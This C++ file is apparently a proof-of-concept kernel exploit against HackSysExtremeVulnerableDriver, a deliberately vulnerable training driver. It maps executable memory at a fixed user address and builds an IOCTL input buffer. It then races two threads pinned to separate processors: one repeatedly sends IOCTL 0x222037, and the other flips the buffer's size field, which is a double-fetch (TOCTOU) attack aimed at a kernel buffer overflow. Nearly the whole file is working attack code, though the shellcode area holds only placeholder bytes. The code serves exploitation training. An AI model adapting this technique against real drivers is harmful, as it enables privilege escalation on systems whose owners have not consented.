#include <iostream>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>
#include <vector>
#include <ctime>
#include <windows.h> // For Windows-specific APIs like SetThreadPriority
#include <thread>


#pragma comment (lib,"psapi")

char exploit[80 + 8];

using namespace std;

void set_thread_priority(thread& t, int priority) {
    // Get the thread handle and set its priority
    HANDLE thread_handle = (HANDLE)t.native_handle();
    if (!SetThreadPriority(thread_handle, priority)) {
        cerr << "[!] Failed to set thread priority. Error: " << GetLastError() << endl;
    }
}

void send_ioctl(HANDLE driver_handle, ULONG ioctl, char* exploit, ULONG driver_input_buffer_length, char* output, ULONG driver_output_buffer_length, uint64_t* second_bytes) {
    LPDWORD lpBytesReturned = 0;
    while (true) {
        *second_bytes = 0x0000000000000800;
        if (!DeviceIoControl(driver_handle, ioctl, exploit, driver_input_buffer_length, output, driver_output_buffer_length, lpBytesReturned, NULL)) {
            printf("[!] Error while calling DeviceIoControl\n");
        }
    }
}

void manipulate_memory(uint64_t* second_bytes) {
    while (true) {
        *second_bytes = 0x0000000000001000;
        
    }
}

void set_thread_affinity(thread& t, DWORD_PTR processor_mask) {
    // Get the thread handle and set its affinity mask
    HANDLE thread_handle = (HANDLE)t.native_handle();
    if (!SetThreadAffinityMask(thread_handle, processor_mask)) {
        cerr << "[!] Failed to set thread affinity. Error: " << GetLastError() << endl;
    }
}

int main()
{  
    HANDLE driver_handle = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (driver_handle == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while opening a handle to the driver: %d\n", GetLastError());
        return 0;
    }
    printf("[+] Successfully obtained the driver handle.\n");

    ULONGLONG shellcode = 0x00000001a0000000; // Userland 
    LPVOID allocation_sc = VirtualAlloc((LPVOID)shellcode, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocation_sc == NULL)
    {
        printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
        exit(1);
    }
    memset(allocation_sc, 0x41, 0x1000);

    ULONG ioctl = 0x222037;

    ULONG driver_input_buffer_length = 80;
    printf("[*] Preparing our exploit buffer\n");
    memset(exploit, 0x41, 80);

    uint64_t* first_bytes = reinterpret_cast<uint64_t*>(exploit);
    *first_bytes = 0x00000001a0000000;
    uint64_t* second_bytes = first_bytes + 1;
    *second_bytes = 0x0000000000000800;

    ULONG driver_output_buffer_length = 2000;
    char output[2000];
    printf("[*] Preparing our exploit buffer\n");
    memset(output, 0x0, 2000);

    getchar();

    // Create the threads
    thread memory_thread(manipulate_memory, second_bytes);
    thread ioctl_thread(send_ioctl, driver_handle, ioctl, exploit, driver_input_buffer_length, output, driver_output_buffer_length, second_bytes);
    
    // Set threads to highest priority
    set_thread_priority(ioctl_thread, THREAD_PRIORITY_HIGHEST);
    set_thread_priority(memory_thread, THREAD_PRIORITY_HIGHEST);

    
    // Set threads to run on different processors
    set_thread_affinity(ioctl_thread, 1 << 0); // Bind to Processor 0
    set_thread_affinity(memory_thread, 1 << 1); // Bind to Processor 1
    
    // Join threads (optional if you want the main function to wait)
    ioctl_thread.join();
    memory_thread.join();
    return 0;
}